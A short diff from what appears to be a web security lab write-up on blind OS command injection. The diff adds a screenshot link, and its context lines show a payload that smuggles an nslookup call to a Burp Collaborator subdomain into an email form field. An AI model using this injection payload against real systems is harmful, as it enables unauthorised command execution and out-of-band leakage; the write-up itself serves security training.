@@ -14,3 +14,6 @@ To prevent the Academy platform being used to attack third parties, our firewall
     email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
 
     * Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified email parameter.
+
+
+![Screenshot_2023-05-19_23_26_00](https://github.com/a-fai1ur3/Writeups/assets/119417999/888a1fb6-ffc1-46c7-86b9-c3ed0b6eef7f)
